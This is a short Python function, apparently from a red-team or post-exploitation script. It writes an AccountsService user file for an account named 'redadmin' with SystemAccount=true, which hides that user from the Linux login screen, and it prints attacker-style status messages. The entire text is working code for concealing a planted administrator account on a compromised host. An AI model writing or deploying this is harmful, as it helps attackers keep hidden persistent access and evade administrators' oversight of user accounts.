import os


def add_system_account_func():
    print(f"[*] START CHANGE SYSTEM ACCOUNT")
    os.chdir("/var/lib/AccountsService/users")
    data = "[User]\nSession=\nSystemAccount=true\n"

    with open('redadmin', 'w+') as f:
        f.write(data)
    print(f"[+] CHANGE SYSTEM ACCOUNT SUCCESSFULLY")
    print("===============================")